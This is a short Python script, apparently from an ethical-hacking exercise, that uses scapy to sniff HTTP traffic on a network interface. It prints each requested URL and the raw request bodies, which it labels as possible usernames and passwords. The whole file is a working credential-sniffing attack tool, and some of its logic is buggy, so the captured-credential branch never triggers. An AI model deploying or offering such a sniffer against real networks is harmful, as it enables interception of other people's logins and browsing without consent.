#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse
import time

#pip install scapy_http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw])


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


def get_argumetns():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter the desired interface")
    options = parser.parse_args()[0]
    return options

try:
    options = get_argumetns()
    if not options.interface:
        print("J3wker | Network sniffer | Sensentive Information detector\n")
        print("\t\t(\_/)")
        print("\t\t(0_0)")
        print("------------------------")
        print("Possibale Interfaces - eth0 - wlan0 and such\n type 'ifconfig' to confirm")
        time.sleep(1)
        print("------------------------")
        options.interface = raw_input("Interface to Sniff on -> ")
        print("------------------------")
        print("Starting Sniffer on " + str(options.interface))
        sniff(options.interface)
    else:
        options = get_argumetns()
        print("J3wker | Network sniffer | Sensentive Information detector\n")
        print("------------------------")
        print("Starting Sniffer on " + str(options.interface))
        sniff(options.interface)
except KeyboardInterrupt:
        time.sleep(1)
        print("\n\nExiting Program - Stopping Sniffer")
